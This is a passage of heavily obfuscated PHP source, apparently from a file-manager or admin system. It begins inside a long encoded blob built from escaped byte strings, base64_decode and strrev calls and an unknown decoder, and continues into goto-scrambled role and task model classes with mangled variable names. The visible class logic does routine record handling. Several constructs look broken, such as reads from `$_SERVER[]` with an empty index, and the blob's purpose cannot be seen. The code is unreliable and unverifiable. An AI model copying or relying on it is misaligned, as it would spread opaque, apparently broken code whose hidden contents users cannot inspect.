\35\355\265\236\125\141\226\72\356\232"."\46\301\131\314\352\357\55\146\302\126\314\152\147\61\142\142\73\165\272\275\14\17\11\215\343\47\233\344\34\164\342\115\376\33\317\27\74\360\17\211\21\12\104\164\241\61\137\6\35\26\10\212\12\36\212\210"."\356\137\46\270\60\242\33\52\220\214\345\362\25\11\71\23\115\75\155\215\61\215\51\21\65\102\122\204\272\221\212\260\24\22\67\113\61\155\255\320\215\50\173\324\44\241\132\275\140\257\54\163\25\102\74\232"."\0\156\306\13\320\206\122\110\202\100\200\335\253\216\123\363\351\145\36\174\123\313\361\13\60\321\305\340\206\74\346\110\43\104\350\230\4\345\47\10\50\7\316\16\132\30\74\274\214\303\263\113\241\145\313\74"."\201\256\366\260\7\225\207\314\355\370\267\341\365\243\41\132\347\343\217\62\1\233\41\146\162\172\102\316\305\161\31\374\26\113\326\0\127\141\306\331\313\74\70\16\112\363\330\123\62\124\73\51\247\153\31\325".base64_decode('KqbsbersjaCqFEEGjwMlB8r7gQw2DDn3Q/h2jJQyqiaVbnm4DEFBKCWZPMPAOTiPt+WAByAsC38=').base64_decode('ewcx33Z2eidmCdAkeGQNuo7mRllSHC4U5BNYqFgUZq20AJHRJgFnpHaLPkBoUB2nQ9x5kGLaQt0=')."\xbd\x7d\x51\x7f\xbb\xa7\x2c\x12\x5\xa\x97\xc\x22\x55\x96\x49\x86\x27\xc6\x60\x67\x8e\xce\xc\xa7\xc9\x35\xd\xa\x52\xcf\x2\x85\xf1\x53\x4e\x31\x53\x69\x6a\x7\x54\xcc\x17\xb5\xfb\x44\xf4\x92\x44\x1\x10\xd0\x1a\xe6\xe7"."\363\35\152\256\314\102\364\75\150\40\251\150\266\203\16\226\65\307\14\145\175\130\6\45\20\11\241\206\202\125\212\277\207\52\176\261\54\102\177\126\265\224\126\71\127\362\51\224\245\64\225\366\16\327\302\53".base64_decode('13c8lUJaVdmcZpRKUPwrhYWYBOWkS05ZpksuuuS84ZJHDVdC14ZdKTMN/kwXWHphcjoHEHOyKwc=').strrev('GFɞd/,kc]78YEˆб y'."\r".'w5TWT+')._kodDe('KUamncxpk+lOjI0+f0hm7kkeEL6f/Va167V02a1bAJ2x2J66yVNqPMzxmitdOOrN7aoGFAgaAOR1').strrev('15%)Tgדtȝ&pPmn@>#8b{,9').strrev('FꎷO@@Ό(ǮPQ]G(q?f;aW'."\r".'').base64_decode('QjXpA0Ws6YOisPnfZxKZ4f+Qi8unGUUz/uevCpkmFGrc8t9n53lAR1Fb6f+ho2CmuPhWGEEyPQU=')."\65\11\71\265\247\326\303\257\106\220\130\103\347\336\74\60\113\107\135\351\171\160\252\215\202\151\66\352\312\353\243\140\106\253\56\43\77\232\160\345\207\107\101\0\312\314\171\60\17\101\130\1\42\241\71\226".base64_decode('JnO3IVPvasgUXDKY+AkVcAB1NO3SzFEXmP3g/zELFAd+80AWyUMJPQ9E9VE9QdkO1Kz16Bp01Q8=')."\35\331\173\306\340\321\235\153\72\341\272\24\77\213\116\336\112\63\114\374\257\154\300\145\237\260\111\162\250\26\27\354\15\376\153\26\341\50\13\47\13\45\341\332\242\75\214\60\43\227\171\110\53\260\224\10"."\x13\x5c\x4c\xfe\xe4\x68\x24\x33\xbc\x55\x49\xc6\x73\xba\x3e\x5c\x2c\x8\xac\x0\xa7\xe2\x5d\xb6\xe9\x19\xa8\xad\x9b\xaa\x1b\xf4\xf0\xe9\xfd\x43\x98\xb8\xd8\x1f\xc2\x42\x8c\x41\x40\xe2\x3d\x83\xd1\x51\x7a\xfc\xfb\xab\x48\xbe"."\44\144\20\366\220\234\157\162\176\71\45\362\313\51\302\354\6\155\302\257\223\70\30\327\205\11\260\23\350\131\50\371\55\341\272\3\6\330\63\212\363\252\314\356\201\210\134\224\31\323\367\316\155\25\141\223"."\357\173\260\34\154\336\306\334\155\54\72\317\26\157\333\116\270\4\214\6\5\207\113\370\271\221\314\252\364\202\11\135\220\210\146\272\164\153\240\244\4\171\237\76\374\56\274\61\3\132\4\166\150\320\133\11".strrev('.EpUa>'."\r".'MMw9Pɠ&tN').strrev('$ZI.X(HCD/AQ/P04oWoHl\\X7c]%RD')."\xd1\xe3\xd2\xad\x30\x51\x82\x8c\x30\xdf\x54\x31\xac\xa7\x92\x39\xbd\x98\xaa\xe0\x5\x7a\xeb\x3c\xb5\xd2\xbc\xda\x3a\xa9\x4f\xa3\x3a\x93\x74\x7b\x44\x5f\xc\xd7\x74\xb7\xf0\xd4\x9f\xe3\xcd\x70\x7b\xa2\xed\x39\x5b\xfa\x71\x9c"."\4\366\22\200\254\204\35\163\150\124\61\4\365\177\372\102\63\371\355\16\255\44\152\275\155\241\136\162\176\320\275\234\251\234\264\53\5\52\64\267\225\74\375\213\264\144\306\363\271\45\114\7\107\70\25\135"."\332\336\130\60\364\102\132\325\122\22\300\321\314\306\366\246\212\166\337\312\306\212\146\220\44\347\162\60\125\362\66\57\365\162\104\62\142\275\341\120\157\107\200\271\147\350\205\103\100\216\307\310\263\343\364\5"."\x79\xf2\x29\x9b\xe2\x77\x5\xe8\xe9\xa\xae\xf8\x5d\x81\xea\x54\x21\x51\x9f\x71\xc8\x94\x6\x7\xeb\xea\x89\x97\x42\xd1\xc6\x94\x28\x4f\x42\x5b\x31\xa1\x1f\x60\x94\x99\x9b\x20\x2\x69\xf7\x43\x2b\x7c\x81\x3c\xb2\xec\x14\xdc"."\141\343\200\201\304\314\256\113\64\263\3\35\1\327\47\170\31\16\173\25\166\114\22\152\6\241\111\203\273\306\226\316\162\145\24\213\134\300\42\70\254\135\312\13\327\35\67\176\112\135\67\46\140\146\7\132".base64_decode('2Y9SBSdkwc+vk8ktNZnlgpUutzBOMMsDUCS6r3MMNIlGmiqIGR6dF5AZVjRjvrc00qiMw0EFTW4=')."\16\241\147\226\173\164\13\151\70\55\365\212\151\0\221\150\253\66\263\341\202\30\24\210\212\203\255\106\125\151\266\23\55\334\257\67\112\354\215\154\116\261\105\53\115\10\166\245\154\114\64\112\145\336\332\316"."\225\125\32\267\120\211\204\211\165\107\313\116\132\150\103\4\252\326\264\150\301\274\332\132\127\276\150\132\156\103\261\277\171\12\73\112\42\347\207\335\21\67\236\330\356\225\52\340\7\355\324\32\31\75\171\336"."\50\221\211\340\222\350\374\300\241\136\137\264\255\313\45\41\142\165\111\235\376\50\0\367\201\177\260\312\276\113\202\363\32\44\203\171\356\222\240\55\260\113\352\353\301\277\134\335\32\364\35\46\13\144\54\203"."\272\22\304\41\105\123\242\361\222\50\111\202\63\26\152\302\220\136\307\0\72\242\371\306\176\125\153\250\207\332\326\330\34\10\356\323\11\61\0\356\130\64\264\106\354\143\310\164\347\325\44\130\325\301\212\352"."\x6\x24\xd1\x8\xd5\xed\xec\x65\xd0\x8b\xcc\xff\xff\x12\x60\x2d\xa8\xca\xf7\xff\x7f\x29\x50\x3b\xc2\x67\x81\x45\x26\x51\xb4\x14\xf3\x7f\x2a\x83\x32\x38\xd6\x55\x58\x83\xa8\x99\xac\xa\x75\x52\x7d\x6d\xad\x14\x5a\xe\xd1\x48"."\312\256\102\56\332\311\204\27\340\361\41\253\64\326\304\110\311\243\364\125\325\54\234\144\252\126\240\76\36\21\243\2\3\37\26\136\233\327\355\313\101\324\306\255\111\303\122\224\123\223\321\206\332\352\51\270".strrev('m#YuOCqEs0LbClb'."\n".'#TY4>;X\'y'."\0".'').base64_decode('EPQxTaGTHuaH9nJeBPRyxgzzYUSWj/jEbA7gohWIQmH2VkHrqGY6K/SCPFJUGLzRMUtYm1EmRgY=').base64_decode('jh6jWLauZeSCi4SPnrmj6BucAWl4hWiUoCtjN+AnoyUsuYQW4IBOyxOnXcS/d2XFCrd0YUXEhoM=')."\253\334\376\361\2\250\243\222\2\53\65\330\260\117\330\14\157\275\107\140\333\12\174\155\127\123\355\246\1\346\134\210\334\362\20\373\374\121\264\114\21\46\15\245\121\22\36\5\363\1\72\103\115\325\71\1".strrev('|9(/2F[8Y4dg3( SY9'."\n".'ƑfY,qO[')."\x58\x82\xcc\xc1\x28\x7c\x62\x1a\x78\x32\x67\x40\x2f\x66\x29\x31\xae\xe6\xe1\x15\xa3\xcc\x2a\x69\x0\x91\x1d\x70\xa3\x61\x8a\x93\x31\x14\x45\xb3\x41\x12\xb9\xa2\x62\x3\xc8\xb9\x42\x56\x46\x10\xc\x20\xaf\x29\xb4\x25\xbc\x6d"."\x19\x6f\x9b\xe1\x6d\x23\x5b\xed\xed\xf1\xcf\xe\x24\x99\xac\x5a\xc4\x3f\x13\x7d\x83\x1\x35\x10\xef\xa4\xa1\x47\x98\x8c\x9a\x2e\xb\x87\x57\x73\x65\x13\xa\x54\xaa\x1b\xe3\x1a\x3b\x59\x41\x97\x46\x40\x87\x97\xd5\xe8\x4e\x42"."\110\11\353\26\133\133\271\215\16\112\112\347\250\106\127\240\273\63\336\21\14\364\306\221\210\37\352\211\372\202\216\4\300\63\243\201\266\22\160\153\210\372\216\165\324\72\221\267\153\234\251\32\132\346\173\271".base64_decode('bxsQlU3mO5W4JCR5oPo+Di5ZmjC81NwwIWx4zLycYwpNXqpS7jWLREQg7k+CATJ3vGR/F1QT1G4=')."\xa7\x2d\xb8\x6\x34\x1\x7a\xa9\x8\x85\x7d\xe1\xd5\xdc\x79\x2e\x48\x89\xfa\xc2\xd3\xa4\xc0\x3c\xc4\x19\x1d\xf5\x8f\xb6\x64\xd9\xb2\x65\xf4\x29\xcd\x64\xe\xdb\x27\x42\x35\x7e\x76\x5f\xe\xa0\xf0\xf4\x49\x29\x85\xca\xa5\x98"."\120\3\17\231\357\330\356\333\303\262\341\303\55\50\223\270\106\55\114\223\250\26\350\103\210\5\252\111\136\50\322\313\154\166\234\46\370\244\131\110\176\307\311\157\142\222\220\265\154\20\335\201\244\114\362\253"."\x26\x39\x1f\xcb\x4c\x42\xd5\x37\x1a\x6\x2b\x4d\x8e\x9f\x63\x22\xbd\xdf\x41\xa9\x4d\xd6\x2a\x2d\x29\x4\xd0\x96\x48\xdd\xd0\x7e\x48\xcb\x48\x93\xa0\xe5\xd8\x3b\xb3\xc9\x3d\x69\x98\x59\x25\x97\x8b\x43\x95\x37\x52\xdd\x64\x56"."\x97\x9c\x1b\x48\x1a\x9d\xfe\x1b\xbc\x18\x2\x2e\x52\x7d\xd\xc8\x3c\x41\x5\xc9\xa4\x22\x33\x59\xb8\xed\xe7\x7e\x23\x88\xed\x9c\xc7\x43\x94\x78\xa0\xbb\x1\xc0\x4c\xec\x48\xc8\x3\x26\xf5\x23\x80\x8e\xd\xe2\x80\xcf\x9\x8e"."\22\241\244\44\301\245\5\131\52\330\174\265\54\327\123\144\330\32\261\203\226\224\62\276\104\102\336\207\210\217\355\362\16\177\320\147\44\360\31\150\241\45\141\53\127\233\202\40\106\50\201\64\332\364\14\161"."\102\151\205\147\327\326\325\12\126\27\201\66\177\44\176\170\4\372\334\14\6\250\357\27\173\102\0\244\105\303\323\244\370\302\323\245\204\132\17\237\46\245\215\356\37\354\51\301\120\50\42\272\31\162\124\257"."\xaf\x57\x70\x34\x48\xf6\xc7\x70\xed\xa6\x4f\x63\xf4\xf4\x5\x9\xff\x8a\x11\xa\x8e\x11\x5e\xdc\x46\xd4\x9b\x62\xc5\xd9\xb5\xf3\xa8\x41\xe\x7f\x1a\x12\xf6\x4d\x5c\x78\xc0\x19\x1f\x99\xe1\xb0\x8e\x76\x68\x38\x2c\x25\x65\x6c"."\270\222\120\260\124\240\244\240\223\121\130\73\311\4\262\62\345\344\207\101\17\302\136\157\225\147\156\365\254\303\362\42\54\126\3\201\261\32\357\141\175\244\32\207\161\30\100\230\305\340\336\43\252\52\246\52".strrev('E@MfX`<'."\0".'umbjx'."\r".'3'."\r".'?(X_jU5=')."\xa7\x66\xe0\x88\x58\x6c\x10\x6\xab\x1\xac\x11\xc2\x63\x11\x4f\x4d\xb5\xab\x65\x96\xb7\x4f\x35\x45\x7c\xec\x95\x79\x5a\x1c\xd2\xe5\xd4\xf6\xab\xc0\xe\xf7\xa1\xc8\xa2\x82\x5d\x12\xb2\x76\x10\xf5\x69\x7b\xfd\x80\x29\xb\xbe".strrev('wE'."\n".'3	T@JԶm+WR'."\n".'kRCyQ<ln[ A|').base64_decode('CCK+3gHjwkukQl2BvCZ4RoEFUc9BRBCQzew0rnSwVwvQAKFOiLV44IZfWGi7HC6hyDaqtA9xGBA=')."\62\231\132\10\17\174\12\355\153\250\263\17\256\23\76\226\40\75\0\373\70\356\370\40\263\114\316\11\333\121\256\3\203\244\11\256\205\105\243\124\104\112\312\5\170\137\223\302\47\343\240\343\311\267\131\250"."\xaf\x17\x3a\x62\x83\x9c\x20\x4e\xcf\x50\x5\x50\xa0\x27\x10\x8f\x4\xd6\xf8\x4b\x12\xa0\x7f\xe1\xf2\x29\x60\xbd\x8f\x6\xa8\xf8\x23\xc0\x7b\x42\xc8\xf7\x99\xd\xde\xd7\xb3\xbc\x27\xd4\x5f\xe\x35\xda\xdd\xcb\x65\x9\x21\xa9"."\xcd\xd7\x13\x8d\xb\x7b\x52\xbc\x59\x1\x5b\x2e\xb6\x5b\xa1\xa\xeb\x49\x23\xd9\x50\x9f\x60\xd3\x8c\xf9\x4\xa3\xb2\x3c\x99\x29\x74\xcd\xe7\x7e\x6\xc6\xdd\x4c\x7f\x9f\xee\x77\xda\xb9\x7b\x10\x92\xd\x1d\xbc\x92\x2a\x20\x67"."\x29\x24\x83\x78\x8a\x23\x26\xbb\xa4\xb2\x67\x38\x6c\x43\x65\xc8\x9a\x99\x56\xc\xc7\xf1\x64\x42\xd5\x64\xea\x21\x35\x4f\xbf\x9d\x67\x16\x6b\xd0\x63\x12\xf5\x32\x83\xac\xcb\xa8\x64\x20\xde\x5d\x17\xd8\x5\x20\x31\xe9\x32\x40"."\252\221\202\366\107\302\231\235\146\205\225\214\30\15\352\114\147\17\255\346\145\212\200\57\344\10\146\44\160\223\342\113\132\105\361\45\36\341\351\161\20\23\236\201\27\114\351\334\165\22\153\121\34\227\214\43"."\x73\x85\x4\xac\x29\x5e\xc6\x1c\xcf\xe1\x30\x0\xd9\xb7\xe2\xc9\xb\x1d\xf6\x6a\x91\x62\x82\x39\x83\x71\xd8\xcf\x51\x37\xa4\x92\x68\xb9\x46\x1d\x88\xc2\x2\xd0\xe3\x31\xb0\x5\xa6\x98\x6\x8a\x85\x2f\xf\xf3\x96\x89\x59\xd0"."\67\113\262\340\64\150\140\306\131\231\230\142\102\205\254\76\52\166\225\113\51\363\51\224\44\364\150\222\356\343\310\122\104\72\161\65\357\53\213\366\167\275\233\76\371\244\213\156\341\260\171\32\351\134\167\275"."\44\220\27\344\75\2\105\340\323\10\326\215\334\340\62\307\161\164\350\350\100\260\102\342\6\175\370\331\33\66\264\350\175\34\26\63\4\143\57\45\105\207\16\275\57\123\166\55\301\100\364\0\115\131\163\50"."\xdc\x59\x30\xb9\xdd\xe6\x66\xd2\x81\x0\xa6\xbc\x3d\x9d\x3c\x20\x2f\x54\xc6\x9e\xc1\xc0\x6e\xf7\xda\x15\xee\x85\x3\x65\xe1\x75\xe6\xde\x39\x1\x48\xc7\x4f\xd2\xb\x9d\xc0\x9d\xb7\xe1\xc7\x73\xa8\x53\x51\x5f\x2a\xe5\x4\x47"."\x75\x6\x2c\x75\x0\xe7\x61\xee\x50\x89\xdb\x76\xb0\x1\x8d\x4\x42\x3d\x55\xd5\x50\xa2\xb2\x99\xec\x77\x4f\x30\xc7\xda\x60\xd4\xd0\x9a\xdd\x2d\x8f\xf3\x41\x61\x11\x9a\xca\x68\xd2\xb4\x45\xb0\x3b\x43\x5b\x6e\x6\x62\x58\x63".base64_decode('SoKxaMI0u3q9DNRKu4m9o0IMl6EXe7HQEJFPx7C1E+GbjczDI93+jOXVpBQMdcK9d3sgslzKKJY=')."\304\205\36\164\111\141\237\345\310\337\2\72\324\243\104\236\240\52\54\50\350\106\7\40\156\233\217\35\266\43\21\135\77\302\202\112\12\306\243\56\26\7\117\117\334\51\146\310\352\300\245\102\102\111\16\361"."\xfb\x42\x1e\xb8\xa3\xb1\xf3\x5\x4\x26\x7b\x1d\x7b\x39\x13\xa\xbc\x7\x28\xff\xed\x62\x99\xef\x12\xfc\x1c\x3f\x3b\x11\x32\xa8\xda\xa8\x6a\xaa\x7c\xca\xd3\xae\x9a\x10\xf1\x4b\xfa\x12\x35\x45\x40\x80\x1e\xb7\xb8\x75\x37\xeb"."\x56\xf6\x9d\x12\xab\x63\x1e\xc7\x38\xe4\x11\x2e\xc1\xbe\x15\xf\x89\xf8\xf6\x9c\xb0\x1a\x40\xdf\x2\x60\xa9\xe5\xba\x6e\x5\xea\x73\x85\x5c\xaf\x53\xda\x20\x51\xe1\xa6\xda\xf6\x48\x1d\x49\x6\x3b\x41\x59\xa5\xa4\x8e\xc3\x42".strrev(''."\n".'oS#÷whp&*	ձTDd'."\r".'%"Ң@j%q]:+p')."\204\327\226\320\45\61\231\126\252\216\214\114\211\245\46\206\5\102\161\374\260\22\216\172\235\42\162\32\231\201\42\353\42\301\243\217\227\36\71\62\57\324\360\344\331\117\375\313\170\54\32\202\140\156\127\12".base64_decode('M9KHtGhlcdTplzVrk5FLcUGaxM3fGYLUJNUiLwpYnwbd7yylnulh47FJMnpMzJ8vWDZz5S7V5C8=')."\114\40\61\201\157\207\240\354\245\347\47\112\0\66\173\370\40\255\6\163\35\12\315\110\264\264\56\266\14\261\54\77\140\15\56\24\302\146\320\56\170\122\155\365\42\42\10\52\243\212\75\373\264\145\231\116"."\136\317\370\264\215\61\242\210\100\107\310\376\124\360\320\116\177\241\327\31\46\137\302\252\10\202\10\261\132\212\221\137\312\3\235\105\203\261\151\43\132\41\224\0\141\264\44\261\133\341\152\150\244\256\56\316"."\xd6\xf1\x6d\x34\x0\x61\xd7\x44\x20\xc0\x29\x9a\xa6\x9\xc3\x8f\xd5\xd1\xc3\xd8\x51\xa1\x7\x3b\xa7\xa0\x72\x47\x46\x65\xde\x48\x6d\x68\x84\xdc\xc1\x16\x81\x1f\x16\x3a\xdc\xa8\x90\xf5\xd\xbb\x54\x29\x6a\x1\xec\x7f\xde\x6".strrev('K=b:ãp>&E#}'."\0".'P?A:,R!{|?pbtZ5')."\244\245\22\235\57\246\145\243\43\50\162\0\151\304\205\2\210\70\105\41\251\74\324\106\234\10\205\15\30\172\343\220\215\35\354\121\362\323\256\244\231\370\10\343\174\237\41\276\304\101\233\200\11\243\344\33"."\350\27\156\242\135\270\215\56\106\56\252\31\104\352\205\146\4\13\130\56\356\352\335\205\317\346\221\21\13\147\16\274\73\50\331\147\24\376\101\130\303\250\370\161\233\44\347\24\342\130\57\71\62\204\235\75"."\31\325\113\175\37\160\17\106\132\61\317\135\105\201\210\135\200\305\242\75\365\32\361\75\315\55\32\71\27\122\215\165\321\367\351\134\370\35\124\227\255\10\124\241\270\45\64\230\111\123\216\341\52\371\330\177"."\121\72\161\123\213\4\132\40\32\140\147\22\70\251\21\135\154\224\107\123\155\164\11\166\217\374\310\30\277\242\131\160\62\312\325\371\124\175\303\374\305\342\176\221\17\43\367\121\103\216\362\211\226\17\75\32"."\143\204\41\331\351\114\242\117\167\212\63\33\45\332\275\355\222\367\124\5\56\350\340\137\377\325\164\360\225\23\67\161\46\341\4\213\225\54\164\101\271\257\374\377\327\303\356\270\214\354\3\333\231\214\51\10"."\x86\xa2\x8\xb\x7a\xdc\xc7\xe6\x90\x95\xd\x69\xb9\x9\x67\xb3\xf0\xfb\x93\xff\x7d\xc5\xa8\x24\x27\xdb\xfd\x58\xa1\x54\xbe\x28\x42\x16\x81\xd7\x4d\x1\x20\x4\x69\xad\x64\x71\x5a\xa\x7\x18\x8a\x15\x82\x26\xf3\x64\x74\x85"."\x7d\x3\x48\xb1\xa1\x9\x6b\x21\x88\xb1\x15\x9e\x3f\x22\x5\x2b\x46\xbf\x36\x8d\xa0\x4f\xe7\x27\xaf\x2e\x72\x61\xcf\xfd\x6e\x20\x52\xb4\x91\xa5\xf0\xf2\xab\xe8\x11\x1e\x15\x14\x15\x1c\xf7\x95\x16\x8d\x76\x9a\xa4\x92\x84\x2e".base64_decode('0ZU88ijn62RO/uF1Ja8CjHFmZOk8xRLcz0P2FaJnc2CrahNcQZzbNgmzK+UAipKGMFvBLFIF4ZM=').strrev('QYdXH>?zJ/ߙ#2-))0͑<'."\r".'A\\eH')."\204\357\36\331\105\47\126\13\304\313\312\115\0\134\11\110\175\144\251\102\101\312\77\241\176\60\62\313\205\171\110\357\331\371\1\152\320\367\254\167\260\70\346\157\132\130\74\105\376\74\103\114\45\144\344\262".base64_decode('xUiES21ItVq4JkJx5jOUvlhFH7KSmc8X6MyGbZXwMRJByeX4WiC+PJJLyIYHkNOwRR2AlYuIDv0=')."\xcb\x48\xf8\x54\xca\xe0\xd\xd0\xd4\xe4\x70\x19\x87\x3f\xb0\xb3\xa1\xda\x8d\xc0\x86\x85\xc5\xab\x4\x8d\x73\xd\xb0\xc6\x31\x75\x39\x1a\x42\xe2\x30\x14\x7b\xc8\x9b\xde\xb6\xe7\x1e\x42\xec\x1a\xb9\x9a\x38\x8b\x1b\x5c\x46\x67".base64_decode('P5xy9HxKnPg2UAm7iNrWAxtQ7B5CBNCfO6UHWw7oWqhVkKsxkin2re3FilJn2aUeoUrLY1NSzMI=').base64_decode('FxAchy8D27ewYtH4Mhhu08JwR+VxFM/mUNl5o5r44E/cbYCQWFE68XoNHa35dihbFQSjJEFhKOI=')."\x64\x5d\x96\x6e\xeb\x35\x20\xa2\xb\x87\xf2\xf8\x11\x48\xfc\xf8\x37\x7c\xc1\xe\x30\x30\x29\xd2\xd7\x5d\x85\x5c\x75\x43\x0\xc\xe0\x87\xc4\xd6\x12\x11\x64\xad\xb4\xab\x24\xfc\x87\x9f\x93\xab\x82\xc9\xb0\x90\xb5\x52\xa0\x87".strrev('+=tn5VtϠ+I+h'."\n".'alt'."\0".'(·Ug-[?')."\37\214\164\304\262\215\11\177\141\335\371\262\72\332\324\341\175\232\155\273\106\24\163\104\220\160\260\4\265\317\355\216\130\121\42\2\323\227\42\111\11\302\351\270\375\236\202\75\255\135\302\272\212\152\120\110"."\106\271\350\303\143\340\27\76\102\20\340\356\31\120\62\76\317\363\215\312\114\151\305\231\253\317\46\363\12\267\32\111\104\201\174\143\202\62\46\100\55\321\77\276\202\352\314\141\145\125\43\325\252\152\51\47"."\176\121\113\60\50\107\7\203\321\132\16\14\144\51\316\275\35\160\141\241\341\374\123\36\345\247\336\134\12\115\245\72\344\321\62\250\314\230\232\101\1\204\241\42\341\107\170\53\205\173\360\125\306\304\257\23"."\274\164\351\62\3\21\113\241\374\55\25\147\273\320\274\141\160\162\321\240\11\56\325\10\271\161\20\302\111\62\237\171\270\50\103\107\31\345\24\167\246\207\353\310\66\214\374\223\366\47\137\30\32\23\314\0"."\xe\x52\x4b\x77\xdb\xa0\xe\x27\xc2\xf0\xec\x8c\x2e\xb8\x8e\x24\xb2\x5b\x15\x8a\x2f\xbb\xa9\xb5\x91\x42\x50\x28\x4e\xbc\xeb\x98\x36\x43\xa4\xfc\x47\x38\xbd\xda\xbb\x38\xe2\xb8\x61\x71\xb0\x50\x8e\x4c\xd7\x3a\xdd\x36\x20\x2"."\203\145\215\45\230\141\61\321\126\105\347\160\243\215\5\247\125\14\314\243\23\55\234\346\263\47\141\174\305\321\42\61\203\263\265\70\207\121\322\147\44\117\371\117\73\77\100\273\314\171\323\310\13\21\366\64".strrev('{49jhyWi%!p[3L[qyْLs^[9pٲ\\LQ%')."\x50\xa7\xeb\xcf\xb2\xc8\xa5\x9f\x23\xc4\xe3\xc4\x46\xdb\xea\xf2\xb5\x28\x7b\x4\x30\x5d\x2d\xca\x22\x4f\x5b\xb\x8e\xed\xb8\xf1\x2c\xc7\x23\x69\x4a\x19\xae\xc8\x2f\x28\x4b\xf9\x2f\x4f\x2b\x73\x5d\x8a\xcb\x84\x8b\x73\xd8\xa6"."\x3d\x58\x92\x2c\xde\xbd\x96\xbf\x9d\xd\x97\x9d\xc5\xa6\xfd\xda\xd4\x1\x17\x3b\x86\xea\x81\x6c\xd9\x70\xdc\xb6\xbb\x4f\xf\xf4\x4a\x34\x20\x82\x6d\x5c\xbb\xa8\xd\x6b\xd4\xc1\x12\xf8\x2\x77\x5c\x8\x8d\x28\x7d\x86\xb3\xff"."\250\14\350\160\327\113\311\123\53\12\56\142\313\372\373\165\301\255\162\351\136\64\107\335\157\211\336\220\361\36\106\267\324\244\240\265\1\201\242\103\137\234\116\77\222\343\7\147\104\200\300\227\161\355\242\22"."\x32\xaa\xad\xa\x9f\x8b\x67\x17\x9e\xb6\xdb\xbd\x32\xe9\x1e\x7e\x90\x6a\x73\x17\x8d\x9e\x13\x63\x86\xe5\x78\x45\x27\x47\xc9\xf8\xe2\x3\x29\xd8\x10\x48\xeb\x4\xdc\x82\xb9\xf0\x42\x89\x93\x23\xba\x61\x41\x83\x73\xc0\xcc\xb"."\350\267\125\267\54\312\143\200\130\214\60\221\334\207\374\331\10\327\271\40\304\337\153\205\175\213\116\261\21\241\42\206\202\202\344\12\6\156\127\43\12\116\105\154\310\26\201\247\343\54\22\56\75\6\357\50"."\72\356\174\70\0\154\64\23\372\70\41\2\364\22\14\257\17\74\306\46\335\342\224\355\370\363\3\204\12\305\313\151\244\21\146\172\161\212\227\150\217\273\121\31\156\362\134\40\323\36\43\331\123\150\142\61".strrev('ۿ]3+$A.QKP5(H}zJF*|ѫE9Wߘ').base64_decode('Qc0AqBdLX7TESYFeVEtfMEjV0EprEWhbzmuCLsT48W0hq9PTUIeKDD3tjsh0mkDmzzbLQljJs1M=')."\54\241\70\373\11\203\70\344\46\175\161\225\5\12\45\333\17\101\112\200\67\371\75\244\260\60\165\374\10\237\1\147\323\237\211\302\250\161\242\112\20\277\376\363\330\256\11\5\70\232\70\210\11\11\4\51"."\256\301\10\100\124\130\35\327\64\216\316\354\164\34\310\332\56\372\20\204\167\10\254\367\341\324\361\303\220\236\20\356\176\60\237\262\161\50\121\27\3\207\35\14\54\25\325\243\162\206\360\25\50\225\360\130"."\xeb\x84\x18\x16\x8f\x42\x9a\x19\x5b\xb1\xe4\xc\xbd\x6d\x77\xb2\x62\xe1\x7a\x19\xf6\xd2\xff\x3\x4\x45\xeb\xb5\xbe\xc2\x0\x0"."", 10, -8))); goto A; D︎: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\162\x6f\x6c\145\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\165\x74\150", "\154\x61\142\145\x6c", "\144\151\x73\160\154\x61\x79", "\x73\x79\163\164\x65\155", "\x64\145\x73\143", "\151\147\156\157\162\145\x45\x78\164", "\151\x67\x6e\x6f\x72\145\x46\151\154\x65\123\x69\x7a\145", "\x61\x64\155\151\156\151\163\x74\162\141\x74\x6f\162", "\163\157\162\x74"); public function listData($D  = false, $b = "\163\x6f\x72\x74", $D = false) { return parent::listData($D , $b, $D); } public function update($aҔկ, $eԨÇ) { goto c; f䬄: return parent::update($aҔկ, $eԨÇ); goto Aގ; c: $F߃ =& $_SERVER[]; $eƯ = parent::listData($aҔկ); $Fʛ↵ = $this->findByName($eԨÇ[$F߃[28]]); goto f; f: if (!$eƯ || $Fʛ↵ && $Fʛ↵[$F߃[363]] != $eƯ[$F߃[363]]) { return !1; } if ($Fʛ↵[$F߃[2445]] == 1) { $eԨÇ = array($F߃[28] => $eԨÇ[$F߃[28]], $F߃[2086] => $eԨÇ[$F߃[2086]]); } $this->filterAuth($eԨÇ[$F߃[372]]); goto f䬄; Aގ: } public function remove($B) { $b͈ = parent::listData($B); if (!$b͈ || $b͈[$_SERVER[][1067]]) { return !1; } return parent::remove($B); } public function add($c򊇝) { goto a֭; B: $f = array($CҶ[382] => $eΉ, $CҶ[2074] => $CҶ[33], $CҶ[2070] => $CҶ[2087], $CҶ[2446] => 1, $CҶ[2073] => 0, $CҶ[2447] => 0, $CҶ[2072] => $this->getSort()); $c򊇝 = array_merge($f, $c򊇝); $this->filterAuth($c򊇝[$CҶ[372]]); goto aʎ; a֭: $CҶ =& $_SERVER[]; $eΉ = $c򊇝[$CҶ[28]]; if ($this->findByName($eΉ)) { return !1; } goto B; aʎ: return parent::insert($c򊇝); goto A; A: } private function getSort() { $d =& $_SERVER[]; $c = parent::listData(); $aѩ = array_to_keyvalue($c, $d[33], $d[2089]); return empty($aѩ) ? 0 : max($aѩ) + 1; } private function filterAuth(&$dƿ) { $Fׯ̋ =& $_SERVER[]; $Cĉ = array(); $a߸ = array_filter(explode($Fׯ̋[47], $dƿ)); foreach ($a߸ as $dƿ) { $c = explode($Fׯ̋[91], $dƿ); if ($c[0] == $Fׯ̋[1748] && $c[1] != $Fׯ̋[1023]) { $aސ = $c[0] . $Fׯ̋[91] . $c[1] . $Fׯ̋[2448]; if (!in_array($aސ, $a߸)) { $Cĉ[] = $aސ; } } $Cĉ[] = $dƿ; } $dƿ = implode($Fׯ̋[47], $Cĉ); } public function sort($c꽶, $A٬) { return parent::update($c꽶, $A٬); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x74\141\163\153\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\171\x70\x65", "\145\166\x65\x6e\x74", "\x74\151\x6d\x65", "\144\x65\x73\x63", "\163\171\x73\x74\145\155", "\145\x6e\x61\x62\x6c\x65", "\x6c\141\x73\164\122\165\x6e", "\x73\157\162\164"); public function listData($FƦޣ = false, $E = "\163\x6f\162\164", $C볅 = false) { return parent::listData($FƦޣ, $E, $C볅); } public function add($FÑγ) { $eݺ =& $_SERVER[]; $f߇쓡 = $this->findByName($FÑγ[$eݺ[28]]); if 